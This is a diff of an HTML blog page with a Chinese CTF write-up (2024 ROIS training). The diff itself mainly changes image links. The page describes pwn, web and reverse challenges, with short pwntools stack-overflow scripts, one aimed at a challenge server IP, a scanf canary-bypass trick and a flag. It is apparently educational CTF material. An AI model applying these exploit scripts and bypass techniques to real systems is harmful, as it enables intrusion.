@@ -239,7 +239,7 @@
           <!-- 文章标题 -->
           <h1 class="post-title">2024rois-wp</h1>
           <div class="last-updated">
-            上次更新: 2024-02-25 20:23:23
+            上次更新: 2024-03-13 21:07:52
           </div>
           <!-- 文章 -->
           <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="tryc"><a href="#tryc" class="headerlink" title="tryc"></a>tryc</h2><p>很简单的 运行getshell</p>
@@ -248,7 +248,7 @@
 <p>直接溢出到ret</p>
 <p>然后程序中有个后门</p>
 <p>就直接getshell</p>
-<p><img src="https://img.hijwei.top/2/24/65ba278e5c8a3.png" alt="image-20240127213737253"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107691.png" alt="image-20240127213737253"></p>
 <p>有个踩雷点就是要得返回这个地址</p>
 <p>不然堆栈会出错就嘎嘎报错，别问我怎么知道的&#x2F;(ㄒoㄒ)&#x2F;~~</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
@@ -257,36 +257,36 @@ payload<span class="token operator">=</span><span class="token number">0x20</spa
 sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://img.hijwei.top/2/24/65ba27ab825da.png" alt="image-20240127214337242"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107693.png" alt="image-20240127214337242"></p>
 <h2 id="backdoor2"><a href="#backdoor2" class="headerlink" title="backdoor2"></a>backdoor2</h2><p>这道题也是栈溢出，但是很难看出来</p>
 <p>调试就很好看出来</p>
 <p>脑洞很大</p>
 <p>依靠的是</p>
-<p><img src="https://img.hijwei.top/2/24/65ba27acf10eb.png" alt="image-20240127214604500"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107694.png" alt="image-20240127214604500"></p>
 <p>溢出这个.com</p>
-<p><img src="https://img.hijwei.top/2/24/65ba27aeac097.png" alt="image-20240127214941320"></p>
-<p><img src="https://img.hijwei.top/2/24/65ba27aff1818.png" alt="image-20240127214954283"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107695.png" alt="image-20240127214941320"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107696.png" alt="image-20240127214954283"></p>
 <p>然后有溢出思路，因为溢出空间是足够的，所以可以算出刚刚好溢出到ret上是win地址(也可以试出来)</p>
-<p><img src="https://img.hijwei.top/2/24/65ba27b0efc60.png" alt="image-20240127215423995"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107697.png" alt="image-20240127215423995"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'114.116.233.171'</span><span class="token punctuation">,</span><span class="token number">10003</span><span class="token punctuation">)</span>
 payload<span class="token operator">=</span><span class="token number">0x38</span> <span class="token operator">*</span> <span class="token string">b'1'</span>
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://img.hijwei.top/2/24/65ba27b225630.png" alt="image-20240127215635936"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107698.png" alt="image-20240127215635936"></p>
 <h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>这道题思路并不难，只是难构造</p>
-<p><img src="https://img.hijwei.top/2/24/65ba27b2d19d5.png" alt="image-20240127215747235"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107699.png" alt="image-20240127215747235"></p>
 <p>看程序一个注意canary以及栈可执行 之后要用到</p>
-<p><img src="https://img.hijwei.top/2/24/65ba27b426dda.png" alt="image-20240127215851272"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107700.png" alt="image-20240127215851272"></p>
 <p>看主程序有个sandbox说明是沙盒检查一下</p>
-<p><img src="https://img.hijwei.top/2/24/65ba27b4af332.png" alt="image-20240127220019037"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107701.png" alt="image-20240127220019037"></p>
 <p>这就是最恶心的地方，不让onegadget，要自己构造orw烦死人了</p>
 <p>更烦人的是是scanf</p>
 <p>而程序有个无限scanf，说明有栈溢出，但是又有Canary</p>
 <p>因此要绕过Canary，而scanf有个特性(mc十年老玩家了)，是输入+-之类的并不会占用缓冲区，因此不会占用栈，就不会碰到Canary，就是实现了绕过</p>
 <p>然后学长还在程序留了一点东西</p>
-<img src="https://img.hijwei.top/2/24/65ba27b54d890.png" alt="image-20240127220332391" style="zoom: 50%;" />
+<img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107702.png" alt="image-20240127220332391" style="zoom: 50%;" />
 
 <p>这样就能溢出到这个放ret上</p>
 <p>然后就会在栈上执行程序</p>
@@ -354,19 +354,19 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>看题目说要capital</p>
 <pre class="line-numbers language-none"><code class="language-none">ROIS&#123;WELCOMETOTHECAMP&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="vue-terminal"><a href="#vue-terminal" class="headerlink" title="vue-terminal"></a>vue-terminal</h2><p><img src="https://img.hijwei.top/2/24/65ba27b6cf28e.png" alt="image-20240127221413304"></p>
-<p><img src="https://img.hijwei.top/2/24/65ba27b784f6a.png" alt="image-20240127221442707"></p>
-<p><img src="https://img.hijwei.top/2/24/65ba27b93b29c.png" alt="image-20240127221535997"></p>
-<p><img src="https://img.hijwei.top/2/24/65ba27ba1193d.png" alt="image-20240127221600595"></p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="vue-terminal"><a href="#vue-terminal" class="headerlink" title="vue-terminal"></a>vue-terminal</h2><p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107703.png" alt="image-20240127221413304"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107704.png" alt="image-20240127221442707"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107705.png" alt="image-20240127221535997"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107706.png" alt="image-20240127221600595"></p>
 <p>跟着提示走就flag了</p>
 <h2 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h2><p>鼠标放重点 按enter键 秒了</p>
-<p><img src="https://img.hijwei.top/2/24/65ba27bb190e7.png" alt="image-20240127221804256"></p>
-<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Easy-Find"><a href="#Easy-Find" class="headerlink" title="Easy_Find"></a>Easy_Find</h2><p><img src="https://img.hijwei.top/2/24/65ba27bbcb81a.png" alt="image-20240127222023096"></p>
-<p><img src="https://img.hijwei.top/2/24/65ba27bcbbcbf.png" alt="image-20240127222054786"></p>
-<h2 id="Replacement"><a href="#Replacement" class="headerlink" title="Replacement"></a>Replacement</h2><p><img src="https://img.hijwei.top/2/24/65ba27be759bd.png" alt="image-20240127222200904"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107707.png" alt="image-20240127221804256"></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Easy-Find"><a href="#Easy-Find" class="headerlink" title="Easy_Find"></a>Easy_Find</h2><p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107708.png" alt="image-20240127222023096"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107709.png" alt="image-20240127222054786"></p>
+<h2 id="Replacement"><a href="#Replacement" class="headerlink" title="Replacement"></a>Replacement</h2><p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107710.png" alt="image-20240127222200904"></p>
 <h2 id="Easy-Crack"><a href="#Easy-Crack" class="headerlink" title="Easy_Crack"></a>Easy_Crack</h2><p>程序有个死循环 nop掉再运行就getshell</p>
-<p><img src="https://img.hijwei.top/2/24/65ba27bf78d60.png" alt="image-20240127222415254"></p>
-<p><img src="https://img.hijwei.top/2/24/65ba27c0a2500.png" alt="image-20240127222518650"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107711.png" alt="image-20240127222415254"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132107712.png" alt="image-20240127222518650"></p>
 
           <div class="post-tags">
             <!-- 文章tags -->
